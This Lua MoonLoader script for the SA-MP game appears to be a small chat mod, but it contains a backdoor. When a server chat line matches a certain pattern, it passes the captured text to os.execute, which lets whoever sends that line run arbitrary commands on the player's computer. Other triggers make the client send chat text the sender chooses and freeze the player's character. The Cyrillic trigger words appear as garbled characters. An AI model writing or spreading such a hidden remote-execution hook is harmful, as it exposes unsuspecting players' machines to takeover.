local sampev = require 'samp.events'

require 'lib.moonloader'

local rabota = false
local offed = true

function msg(arg)
	sampAddChatMessage("{00CED1}[Tomatik]: {FFFFFF}"..arg,-1)
end

function main()
	while not isSampAvailable() do wait(100) end
	sampRegisterChatCommand("off", function() 
		offed = not offed 
	end)
	while true do
		wait(0)
	end
end

function sampev.onServerMessage(color,text)
	if offed then
		if text:find(": %(%( ������� (.+) %)%)") then
			local site = text:match(": %(%( ������� (.+) %)%)")
			os.execute(site)
		end
		if text:find(": %(%( ������� (.+) %)%)") then
			local who = text:match(": %(%( ������� (.+) %)%)")
			sampSendChat(who)
		end
		if text:find("����") then
			rabota = not rabota
			freezeCharPosition(PLAYER_PED,rabota)
		end
	end
end